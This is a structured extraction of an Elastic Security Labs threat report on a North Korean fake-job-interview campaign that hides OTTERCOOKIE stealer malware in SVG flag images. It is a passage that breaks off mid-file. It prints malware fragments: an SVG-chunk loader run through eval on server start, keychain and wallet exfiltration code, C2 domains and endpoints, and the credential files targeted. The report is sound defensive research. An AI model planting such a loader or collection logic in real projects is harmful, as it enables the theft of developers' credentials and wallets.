@@ -1,0 +1,2024 @@
+{
+ "meta": {
+  "adapter": "generic_html",
+  "extractor": "threat_library_html_v6",
+  "source_url": "https://www.elastic.co/security-labs/threat-command/contagious-interview-malware-svg-steganography",
+  "source_host": "www.elastic.co",
+  "content_root": "main",
+  "scope_engine": "section_tree",
+  "scope_engine_version": "tl-scope-engine-section-tree-v2",
+  "section_tree_version": "tl-section-tree-v3",
+  "candidate_extraction_version": "tl-candidates-v30"
+ },
+ "title": "Contagious Interview malware in SVG images: DPRK campaign",
+ "blocks": [
+  {
+   "id": "b001",
+   "page": null,
+   "text": "Threat Command",
+   "type": "paragraph",
+   "section": null
+  },
+  {
+   "id": "b002",
+   "page": null,
+   "text": "New North Korean campaign uses fake coding interviews to steal developer credentials",
+   "type": "heading",
+   "level": 1,
+   "section": "New North Korean campaign uses fake coding interviews to steal developer credentials"
+  },
+  {
+   "id": "b003",
+   "page": null,
+   "text": "DPRK-aligned hackers hid malware inside SVG flag images to backdoor developer job interview coding tests. Not one antivirus vendor caught it.",
+   "type": "paragraph",
+   "section": "New North Korean campaign uses fake coding interviews to steal developer credentials"
+  },
+  {
+   "id": "b004",
+   "page": null,
+   "text": "July 18, 2026",
+   "type": "paragraph",
+   "section": "New North Korean campaign uses fake coding interviews to steal developer credentials"
+  },
+  {
+   "id": "b005",
+   "page": null,
+   "text": "Daniel Stepanic",
+   "type": "paragraph",
+   "section": "New North Korean campaign uses fake coding interviews to steal developer credentials"
+  },
+  {
+   "id": "b006",
+   "page": null,
+   "text": "Threat Intelligence",
+   "type": "paragraph",
+   "section": "New North Korean campaign uses fake coding interviews to steal developer credentials"
+  },
+  {
+   "id": "b007",
+   "page": null,
+   "text": "Jump to",
+   "type": "paragraph",
+   "section": "New North Korean campaign uses fake coding interviews to steal developer credentials"
+  },
+  {
+   "id": "b008",
+   "page": null,
+   "text": "Share",
+   "type": "paragraph",
+   "section": "New North Korean campaign uses fake coding interviews to steal developer credentials"
+  },
+  {
+   "id": "b009",
+   "page": null,
+   "text": "Elastic Security Labs found a new Contagious Interview campaign, tracked as REF9403, hiding malware inside SVG image files using steganography. To our knowledge, this specific infection chain has not been previously documented. We found it after the DPRK-aligned group targeted our own community Slack workspace with a fake job posting and a \"coding challenge\" project.",
+   "type": "paragraph",
+   "section": "New North Korean campaign uses fake coding interviews to steal developer credentials"
+  },
+  {
+   "id": "b010",
+   "page": null,
+   "text": "Any user who ran the project ended up with a four-stage payload aligned with OTTERCOOKIE: a browser credential and crypto wallet stealer, a file stealer, a Socket.IO-based remote access trojan (RAT), and a clipboard stealer. This campaign reinforces that developers remain a prime target, where the compromise of a single individual can provide the initial access needed to enable far-reaching supply chain attacks against downstream organizations.",
+   "type": "paragraph",
+   "section": "New North Korean campaign uses fake coding interviews to steal developer credentials"
+  },
+  {
+   "id": "b011",
+   "page": null,
+   "text": "Key takeaways",
+   "type": "heading",
+   "level": 2,
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b012",
+   "page": null,
+   "text": "Elastic Security Labs discovers new activity aligned with Contagious Interview targeting developers",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b013",
+   "page": null,
+   "text": "Campaigns involve coding challenges and take-home assignments with benign-looking projects containing malicious backdoored code",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b014",
+   "page": null,
+   "text": "Projects hide payloads with steganography in SVG image files",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b015",
+   "page": null,
+   "text": "The distributed malware shares technical and behavioral similarities with OTTERCOOKIE",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b016",
+   "page": null,
+   "text": "How Elastic discovered this malware campaign",
+   "type": "heading",
+   "level": 2,
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b017",
+   "page": null,
+   "text": "This investigation started differently from most of our previous research. Instead of using telemetry to surface interesting threats, we were alerted to suspicious activity targeting members of our community Slack workspace with socially engineered, ad hoc job offers. For background, we use the community Slack platform to engage with and solve problems for our users, focusing on providing product support and syncing on new updates.",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b018",
+   "page": null,
+   "text": "We’ve reported on this technique several times: threat actors targeting developers in open forums with lures of coding side-work. The lucrative offers lead to the requirement to load specific libraries, tools, scripts, etc., into the code the developer is crafting. These components are created by the threat actors and once they’re executed by the developers, they are able to load additional malware and gain remote access to the developer host. From there, the threat actors can steal credentials, keys, wallets, or use the access to gain access to additional systems. We did not find evidence that the lures were targeted at Elastic users specifically, but any open forum where developers congregate is a potential watering hole.",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b019",
+   "page": null,
+   "text": "On May 26, 2026, a user named Maxwell posted in our #jobs channel, stating that they were upgrading an e-commerce platform and were looking for an experienced developer to help with the project. They strategically moved their interactions with interested users into direct messages (DM).",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b020",
+   "page": null,
+   "text": "Fake recruiter Maxwell uses a Slack job posting to lure developers into a Contagious Interview malware trap",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b021",
+   "page": null,
+   "text": "In these direct messages, Maxwell requested that users perform a test challenge as part of the job offer. These recipients were given a trojanized repository that, when executed, contained malware that exfiltrated sensitive files and credentials and configured a Socket.IO backdoor.",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b022",
+   "page": null,
+   "text": "Building on this initial case, we found multiple campaigns exhibiting the same underlying behavior. These trojanized repositories at the time of writing have zero detections and are not flagged by any AV vendors:",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b023",
+   "page": null,
+   "text": "next-ecommerce-private-main.zip",
+   "type": "list",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b024",
+   "page": null,
+   "text": "shopping-platform-main.zip",
+   "type": "list",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b025",
+   "page": null,
+   "text": "ecommerce-platform.zip",
+   "type": "list",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b026",
+   "page": null,
+   "text": "ecommerce-platform-main.zip",
+   "type": "list",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b027",
+   "page": null,
+   "text": "shopping-platform.rar",
+   "type": "list",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b028",
+   "page": null,
+   "text": "shop-main.zip",
+   "type": "list",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b029",
+   "page": null,
+   "text": "ecommerce-main.zip",
+   "type": "list",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b030",
+   "page": null,
+   "text": "Contagious Interview malware samples show zero antivirus detections across seven trojanized repositories on VirusTotal",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b031",
+   "page": null,
+   "text": "These fake challenges operate similarly, containing fully functional code. Our first sample was a Next.js e-commerce template that was copied from GreatStackDev called GoCart.",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b032",
+   "page": null,
+   "text": "GoCart e-commerce template that Contagious Interview malware trojanized to deliver OTTERCOOKIE",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b033",
+   "page": null,
+   "text": "The threat actors tampered with this repository by inserting small snippets of malicious code at various points and using benign variable names to hide their intent. One of the major contributors to this scheme was their use of steganography in SVG images to hide chunks of the malware. While these legitimate-looking projects run perfectly fine, the malicious code is triggered silently behind-the-scenes.",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b034",
+   "page": null,
+   "text": "The payloads are split into Base64 fragments inside HTML comments across every SVG flag image inside an assets directory. These files look like normal images of country flags (AE.svg, AF.svg), but each file contains an injected comment block with Base64-encoded data.",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b035",
+   "page": null,
+   "text": "SVG steganography hides a Contagious Interview malware payload inside a flag image's HTML comment",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b036",
+   "page": null,
+   "text": "A JavaScript file in the repo (serverValidation.js) reassembles these chunks from every flag in alphabetical order to build the malicious payload.",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b037",
+   "page": null,
+   "text": "function validation() {",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b037"
+  },
+  {
+   "id": "b038",
+   "page": null,
+   "text": "const dir = path.join(process.cwd(), \"assets\", \"flags\");",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b037"
+  },
+  {
+   "id": "b039",
+   "page": null,
+   "text": "const files = fs.readdirSync(dir)",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b037"
+  },
+  {
+   "id": "b040",
+   "page": null,
+   "text": ".filter(f => f.endsWith(\".svg\"))",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b037"
+  },
+  {
+   "id": "b041",
+   "page": null,
+   "text": ".sort((a, b) => a.localeCompare(b, \"en\"));",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b037"
+  },
+  {
+   "id": "b042",
+   "page": null,
+   "text": "const parts = [];",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b037"
+  },
+  {
+   "id": "b043",
+   "page": null,
+   "text": "for (const f of files) {",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b037"
+  },
+  {
+   "id": "b044",
+   "page": null,
+   "text": "const raw = fs.readFileSync(path.join(dir, f), \"utf8\");",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b037"
+  },
+  {
+   "id": "b045",
+   "page": null,
+   "text": "const m = raw.match(/<!--\\s*([\\s\\S]*?)\\s*-->/);",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b037"
+  },
+  {
+   "id": "b046",
+   "page": null,
+   "text": "parts.push(m ? m[1].trim() : \"\");",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b037"
+  },
+  {
+   "id": "b047",
+   "page": null,
+   "text": "return parts.join(\"\");",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b037"
+  },
+  {
+   "id": "b048",
+   "page": null,
+   "text": "The malware then decodes this data with a custom Base64-decoding function, Check(), and then uses eval(), avoiding simple detections that might trigger when using the Buffer.from method or the atob() function.",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b049",
+   "page": null,
+   "text": "function runServerValidation() {",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b049"
+  },
+  {
+   "id": "b050",
+   "page": null,
+   "text": "try {",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b049"
+  },
+  {
+   "id": "b051",
+   "page": null,
+   "text": "eval(Check(validation()));",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b049"
+  },
+  {
+   "id": "b052",
+   "page": null,
+   "text": "} catch (err) {}",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b049"
+  },
+  {
+   "id": "b053",
+   "page": null,
+   "text": "On every server start, the file (server/index.js) calls runServerValidation() after the initial middleware setup. As defined in the project's package.json, both npm run dev and npm start launch server/index.js, so the payload executes on each server boot.",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b054",
+   "page": null,
+   "text": "\"name\": \"gocart\",",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b054"
+  },
+  {
+   "id": "b055",
+   "page": null,
+   "text": "\"version\": \"0.1.0\",",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b054"
+  },
+  {
+   "id": "b056",
+   "page": null,
+   "text": "\"private\": true,",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b054"
+  },
+  {
+   "id": "b057",
+   "page": null,
+   "text": "\"scripts\": {",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b054"
+  },
+  {
+   "id": "b058",
+   "page": null,
+   "text": "\"dev\": \"concurrently -n client,server -c blue,green \\\"npm run dev:client\\\" \\\"npm run dev:server\\\"\",",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b054"
+  },
+  {
+   "id": "b059",
+   "page": null,
+   "text": "\"dev:client\": \"next dev --turbopack\",",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b054"
+  },
+  {
+   "id": "b060",
+   "page": null,
+   "text": "\"dev:server\": \"node server/index.js\",",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b054"
+  },
+  {
+   "id": "b061",
+   "page": null,
+   "text": "\"build\": \"next build\",",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b054"
+  },
+  {
+   "id": "b062",
+   "page": null,
+   "text": "\"start\": \"concurrently -n client,server -c blue,green \\\"next start\\\" \\\"node server/index.js\\\"\",",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b054"
+  },
+  {
+   "id": "b063",
+   "page": null,
+   "text": "\"lint\": \"next lint\"",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b054"
+  },
+  {
+   "id": "b064",
+   "page": null,
+   "text": "},",
+   "type": "code",
+   "section": "How Elastic discovered this malware campaign",
+   "line_group": "b054"
+  },
+  {
+   "id": "b065",
+   "page": null,
+   "text": "Unfortunately, this kind of scam is working against developers. Some users have reported suspicious behavior after running the test challenges, while others have pushed these repos to GitHub unknowingly, not aware of the backdoored code.",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b066",
+   "page": null,
+   "text": "GitHub repository named Giveaway hosting Contagious Interview malware disguised as an e-commerce project",
+   "type": "paragraph",
+   "section": "How Elastic discovered this malware campaign"
+  },
+  {
+   "id": "b067",
+   "page": null,
+   "text": "Execution chain",
+   "type": "heading",
+   "level": 2,
+   "section": "Execution chain"
+  },
+  {
+   "id": "b068",
+   "page": null,
+   "text": "How Contagious Interview malware delivers OTTERCOOKIE's wallet, browser, file and clipboard stealer modules",
+   "type": "paragraph",
+   "section": "Execution chain"
+  },
+  {
+   "id": "b069",
+   "page": null,
+   "text": "DPRK attribution: why this links to Contagious Interview",
+   "type": "heading",
+   "level": 2,
+   "section": "DPRK attribution: why this links to Contagious Interview"
+  },
+  {
+   "id": "b070",
+   "page": null,
+   "text": "Our team collected each trojanized repository, extracted the C2 servers, and analyzed each chain. The malicious payloads overlap with previous public reporting on DPRK/Contagious Interview, based on code similarity, behavior and related infrastructure.",
+   "type": "paragraph",
+   "section": "DPRK attribution: why this links to Contagious Interview"
+  },
+  {
+   "id": "b071",
+   "page": null,
+   "text": "The main payload in these repositories shares code similarity with the malware known as OTTERCOOKIE, first discovered by NTT Security in December 2024. Many of the strings, behavior, and script layout match those in previous publications, such as this blog post from Microsoft. While the malicious JavaScript code contains slightly different modifications, the underlying behaviors remain, with many matching strings.",
+   "type": "paragraph",
+   "section": "DPRK attribution: why this links to Contagious Interview"
+  },
+  {
+   "id": "b072",
+   "page": null,
+   "text": "The observed API endpoints in our samples also match recently linked infrastructure by the JFrog Security research team:",
+   "type": "paragraph",
+   "section": "DPRK attribution: why this links to Contagious Interview"
+  },
+  {
+   "id": "b073",
+   "page": null,
+   "text": "/api/service/makelog",
+   "type": "list",
+   "section": "DPRK attribution: why this links to Contagious Interview"
+  },
+  {
+   "id": "b074",
+   "page": null,
+   "text": "/api/service/process/<uid>",
+   "type": "list",
+   "section": "DPRK attribution: why this links to Contagious Interview"
+  },
+  {
+   "id": "b075",
+   "page": null,
+   "text": "/cldbs",
+   "type": "list",
+   "section": "DPRK attribution: why this links to Contagious Interview"
+  },
+  {
+   "id": "b076",
+   "page": null,
+   "text": "/upload",
+   "type": "list",
+   "section": "DPRK attribution: why this links to Contagious Interview"
+  },
+  {
+   "id": "b077",
+   "page": null,
+   "text": "Why do OTTERCOOKIE and BEAVERTAIL overlap in security research?",
+   "type": "heading",
+   "level": 2,
+   "section": "Why do OTTERCOOKIE and BEAVERTAIL overlap in security research?"
+  },
+  {
+   "id": "b078",
+   "page": null,
+   "text": "Analyzing this threat actor's activity is complicated by overlapping capabilities among related malware families. Their rapid evolution makes clean distinctions hard to maintain. Historically, BEAVERTAIL functioned as a first-stage stealer and downloader while OTTERCOOKIE served as a later-stage, C2-driven infostealer and RAT. Our observed samples reflect a convergence toward an all-in-one package that combines a Socket.IO-based RAT, a clipboard stealer, and a consolidated credential, wallet, and file stealer, with no Python stage present. On this basis, we lean toward using the OTTERCOOKIE naming convention, while noting that the boundary between the two is no longer clear.",
+   "type": "paragraph",
+   "section": "Why do OTTERCOOKIE and BEAVERTAIL overlap in security research?"
+  },
+  {
+   "id": "b079",
+   "page": null,
+   "text": "Malware analysis",
+   "type": "heading",
+   "level": 2,
+   "section": "Malware analysis"
+  },
+  {
+   "id": "b080",
+   "page": null,
+   "text": "The following section will cover the technical analysis of the malware.",
+   "type": "paragraph",
+   "section": "Malware analysis"
+  },
+  {
+   "id": "b081",
+   "page": null,
+   "text": "How obfuscator.io hides the malware's code",
+   "type": "heading",
+   "level": 3,
+   "section": "How obfuscator.io hides the malware's code"
+  },
+  {
+   "id": "b082",
+   "page": null,
+   "text": "This JavaScript malware is protected by obfuscator.io, which uses various techniques to prevent static analysis, such as string array extraction with index-based lookups to hide strings, a self-rotating array for anti-tampering, and other toolmarks, such as an infinite loop using while (!![]).",
+   "type": "paragraph",
+   "section": "How obfuscator.io hides the malware's code"
+  },
+  {
+   "id": "b083",
+   "page": null,
+   "text": "const a0_0x33a083 = a0_0x1c05;",
+   "type": "code",
+   "section": "How obfuscator.io hides the malware's code",
+   "line_group": "b083"
+  },
+  {
+   "id": "b084",
+   "page": null,
+   "text": "(function(_0x52f7cc, _0x4093b7) {",
+   "type": "code",
+   "section": "How obfuscator.io hides the malware's code",
+   "line_group": "b083"
+  },
+  {
+   "id": "b085",
+   "page": null,
+   "text": "const _0x388163 = a0_0x1c05, _0x27de29 = _0x52f7cc();",
+   "type": "code",
+   "section": "How obfuscator.io hides the malware's code",
+   "line_group": "b083"
+  },
+  {
+   "id": "b086",
+   "page": null,
+   "text": "while (!![]) {",
+   "type": "code",
+   "section": "How obfuscator.io hides the malware's code",
+   "line_group": "b083"
+  },
+  {
+   "id": "b087",
+   "page": null,
+   "text": "try {",
+   "type": "code",
+   "section": "How obfuscator.io hides the malware's code",
+   "line_group": "b083"
+  },
+  {
+   "id": "b088",
+   "page": null,
+   "text": "const _0x567e1 = parseInt(_0x388163(0x1cb))/0x1+-parseInt(_0x388163(0x160))/0x2 * ( - parseInt(_0x388163(0x135))/0x3)+parseInt(_0x388163(0x13e))/0x4 * ( - parseInt(_0x388163(0x141))/0x5)+parseInt(_0x388163(0x1d3))/0x6 + - parseInt(_0x388163(0x1c9))/0x7*(-parseInt(_0x388163(0x184))/0x8) + parseInt(_0x388163(0x12f))/0x9*(-parseInt(_0x388163(0x1c6))/0xa) + parseInt(_0x388163(0x14f))/0xb*(-parseInt(_0x388163(0x16a))/0xc);",
+   "type": "code",
+   "section": "How obfuscator.io hides the malware's code",
+   "line_group": "b083"
+  },
+  {
+   "id": "b089",
+   "page": null,
+   "text": "There are 4 main modules that get launched at the start of execution:",
+   "type": "paragraph",
+   "section": "How obfuscator.io hides the malware's code"
+  },
+  {
+   "id": "b090",
+   "page": null,
+   "text": "Browser credential / crypto wallet stealer",
+   "type": "list",
+   "section": "How obfuscator.io hides the malware's code"
+  },
+  {
+   "id": "b091",
+   "page": null,
+   "text": "File stealer",
+   "type": "list",
+   "section": "How obfuscator.io hides the malware's code"
+  },
+  {
+   "id": "b092",
+   "page": null,
+   "text": "Socket.IO-based RAT",
+   "type": "list",
+   "section": "How obfuscator.io hides the malware's code"
+  },
+  {
+   "id": "b093",
+   "page": null,
+   "text": "Clipboard stealer / Windows PE dropper",
+   "type": "list",
+   "section": "How obfuscator.io hides the malware's code"
+  },
+  {
+   "id": "b094",
+   "page": null,
+   "text": "How the browser credential and crypto wallet stealer module works",
+   "type": "heading",
+   "level": 3,
+   "section": "How the browser credential and crypto wallet stealer module works"
+  },
+  {
+   "id": "b095",
+   "page": null,
+   "text": "This first module exfiltrates browser-based credentials and crypto wallet extension data across Windows, macOS, and Linux platforms. This module sets its process title to npm-cache, masquerading as a benign npm caching process to avoid suspicion in Windows Task Manager or process listings. The malware detects the operating system at runtime, then enumerates the following browsers based on their file paths:",
+   "type": "paragraph",
+   "section": "How the browser credential and crypto wallet stealer module works"
+  },
+  {
+   "id": "b096",
+   "page": null,
+   "text": "Operating System | Paths ¶ Windows | Chrome, Edge, LT Browser, Brave under %LOCALAPPDATA% ¶ macOS | Chrome, Brave, Opera, LT Browser, Edge under ~/Library/Application Support/ ¶ Linux | Chrome, Edge, LT Browser, Brave under ~/.config/",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "Windows",
+      "Chrome, Edge, LT Browser, Brave under %LOCALAPPDATA%"
+     ],
+     [
+      "macOS",
+      "Chrome, Brave, Opera, LT Browser, Edge under ~/Library/Application Support/"
+     ],
+     [
+      "Linux",
+      "Chrome, Edge, LT Browser, Brave under ~/.config/"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Operating System",
+     "Paths"
+    ]
+   },
+   "layout": "table",
+   "section": "How the browser credential and crypto wallet stealer module works"
+  },
+  {
+   "id": "b097",
+   "page": null,
+   "text": "For each browser profile found, the malware exfiltrates saved credentials (Login Data), autofill data (Web Data), and cryptocurrency wallet extension databases (Local Extension Settings).",
+   "type": "paragraph",
+   "section": "How the browser credential and crypto wallet stealer module works"
+  },
+  {
+   "id": "b098",
+   "page": null,
+   "text": "This data is submitted via multipart HTTP POST requests to the /upload endpoint on the domain ldb.rightwidth[.]dev using the User Agent axios/1.18.1.",
+   "type": "paragraph",
+   "section": "How the browser credential and crypto wallet stealer module works"
+  },
+  {
+   "id": "b099",
+   "page": null,
+   "text": "Below is an example of the network request:",
+   "type": "paragraph",
+   "section": "How the browser credential and crypto wallet stealer module works"
+  },
+  {
+   "id": "b100",
+   "page": null,
+   "text": "OTTERCOOKIE malware exfiltrates Chrome Login Data via HTTP POST, captured in Wireshark",
+   "type": "paragraph",
+   "section": "How the browser credential and crypto wallet stealer module works"
+  },
+  {
+   "id": "b101",
+   "page": null,
+   "text": "OTTERCOOKIE contains a hard-coded list of cryptocurrency wallet browser extension IDs. If a matching extension is found, the malware uploads the associated LevelDB stores to the C2 server via POST requests to the /cldbs endpoint of the domain (ldb.rightwidth[.]dev).",
+   "type": "paragraph",
+   "section": "How the browser credential and crypto wallet stealer module works"
+  },
+  {
+   "id": "b102",
+   "page": null,
+   "text": "Contagious Interview malware sends Chrome cryptocurrency wallet extension data to a command and control server",
+   "type": "paragraph",
+   "section": "How the browser credential and crypto wallet stealer module works"
+  },
+  {
+   "id": "b103",
+   "page": null,
+   "text": "In our sample, the developer has added a prioritization check if the found extension path is in the first 8 targeted wallets. If so, these file paths receive special treatment: they are added to a monitored path array and trigger a separate workflow in which they are acknowledged by the C2 server and retried until successful. The remaining wallet extensions use a fire-and-forget approach with no acknowledgment or retries.",
+   "type": "paragraph",
+   "section": "How the browser credential and crypto wallet stealer module works"
+  },
+  {
+   "id": "b104",
+   "page": null,
+   "text": "if (wps[\"indexOf\"](_0x280b81) < 0x8) {",
+   "type": "code",
+   "section": "How the browser credential and crypto wallet stealer module works",
+   "line_group": "b104"
+  },
+  {
+   "id": "b105",
+   "page": null,
+   "text": "if (mp[\"indexOf\"](_0xb30b7f) == -0x1) mp[\"push\"](_0xb30b7f);",
+   "type": "code",
+   "section": "How the browser credential and crypto wallet stealer module works",
+   "line_group": "b104"
+  },
+  {
+   "id": "b106",
+   "page": null,
+   "text": "const _0x109dd4 = await CLDBS(_0xb30b7f + \"/ldb\"),",
+   "type": "code",
+   "section": "How the browser credential and crypto wallet stealer module works",
+   "line_group": "b104"
+  },
+  {
+   "id": "b107",
+   "page": null,
+   "text": "_0x505c6c = mp[\"indexOf\"](_0xb30b7f);",
+   "type": "code",
+   "section": "How the browser credential and crypto wallet stealer module works",
+   "line_group": "b104"
+  },
+  {
+   "id": "b108",
+   "page": null,
+   "text": "_0x109dd4 == \"ok\" && mp[\"splice\"](_0x505c6c, 0x1);",
+   "type": "code",
+   "section": "How the browser credential and crypto wallet stealer module works",
+   "line_group": "b104"
+  },
+  {
+   "id": "b109",
+   "page": null,
+   "text": "The list of 25 targeted browser extensions used by this module is in the Appendix.",
+   "type": "paragraph",
+   "section": "How the browser credential and crypto wallet stealer module works"
+  },
+  {
+   "id": "b110",
+   "page": null,
+   "text": "For macOS machines, the system keychain database is also exfiltrated through this module.",
+   "type": "paragraph",
+   "section": "How the browser credential and crypto wallet stealer module works"
+  },
+  {
+   "id": "b111",
+   "page": null,
+   "text": "(async () => {",
+   "type": "code",
+   "section": "How the browser credential and crypto wallet stealer module works",
+   "line_group": "b111"
+  },
+  {
+   "id": "b112",
+   "page": null,
+   "text": "const _0xcb5337 = a0_0x4280ea;",
+   "type": "code",
+   "section": "How the browser credential and crypto wallet stealer module works",
+   "line_group": "b111"
+  },
+  {
+   "id": "b113",
+   "page": null,
+   "text": "(os[\"platform\"]() == \"darwin\" &&",
+   "type": "code",
+   "section": "How the browser credential and crypto wallet stealer module works",
+   "line_group": "b111"
+  },
+  {
+   "id": "b114",
+   "page": null,
+   "text": "(await uf(process.env.HOME + \"/Library/Keychains/login.keychain-db\")),",
+   "type": "code",
+   "section": "How the browser credential and crypto wallet stealer module works",
+   "line_group": "b111"
+  },
+  {
+   "id": "b115",
+   "page": null,
+   "text": "await run());",
+   "type": "code",
+   "section": "How the browser credential and crypto wallet stealer module works",
+   "line_group": "b111"
+  },
+  {
+   "id": "b116",
+   "page": null,
+   "text": "})();",
+   "type": "code",
+   "section": "How the browser credential and crypto wallet stealer module works",
+   "line_group": "b111"
+  },
+  {
+   "id": "b117",
+   "page": null,
+   "text": "What files this malware steals from developer machines",
+   "type": "heading",
+   "level": 3,
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b118",
+   "page": null,
+   "text": "This module performs a recursive file sweep targeting various documents and files from developer machines. On Windows, this module is more aggressive and has a larger blast radius, while on macOS/Linux, drive enumeration is skipped and it only targets home directories.",
+   "type": "paragraph",
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b119",
+   "page": null,
+   "text": "Before scanning, the malware enumerates the mounted drives on the system using the following WMI query: wmic logicaldisk get name",
+   "type": "paragraph",
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b120",
+   "page": null,
+   "text": "Next, the malware scans each collected root drive from the previous wmic query or the home directories on other platforms, searching for the following files whose names match a set of glob patterns:",
+   "type": "paragraph",
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b121",
+   "page": null,
+   "text": "*.env*, *.doc, *.docx, *.pdf, *.md, *.rtf, *.odt, *.xls, *.xlsx, *.txt, *.pem, *.ini, *.secret, *.png, *.jpg, *.jpeg, *.webp, *.json, *.ts, *.js, .zsh_history, .bash_history, *.csv",
+   "type": "code",
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b122",
+   "page": null,
+   "text": "In addition, any file whose path contains one of the following credential-store or shell-history locations is collected regardless of its extension:",
+   "type": "paragraph",
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b123",
+   "page": null,
+   "text": ".aws, .azure, .config, .ssh, .bash_history, .zsh_history",
+   "type": "code",
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b124",
+   "page": null,
+   "text": "Ultimately, this file stealer targets sensitive information stored on developer machines, including credentials, configuration files, shell histories, documents, images, and source code.",
+   "type": "paragraph",
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b125",
+   "page": null,
+   "text": "If any of the file patterns get matched, the files are sent through POST requests to the /upload endpoint using the domain (upload.rightwidth[.]dev). The files themselves aren’t additionally encrypted or compressed by the malware when sent over the network.",
+   "type": "paragraph",
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b126",
+   "page": null,
+   "text": "Below is an example of a .txt exfiltrated through this module:",
+   "type": "paragraph",
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b127",
+   "page": null,
+   "text": "OTTERCOOKIE's file stealer uploads a text file from a developer's Python directory over HTTP",
+   "type": "paragraph",
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b128",
+   "page": null,
+   "text": "The following file extensions and file paths are excluded from this file exfiltration module. There is a deliberate scoping decision in which the threat actors seek to maximize their signal and minimize noise. The list also confirms that this group is in tune with the current developer ecosystem, avoiding AI coding tooling extensions such as .claude, .cursor, .gemini, or .windsurf.",
+   "type": "paragraph",
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b129",
+   "page": null,
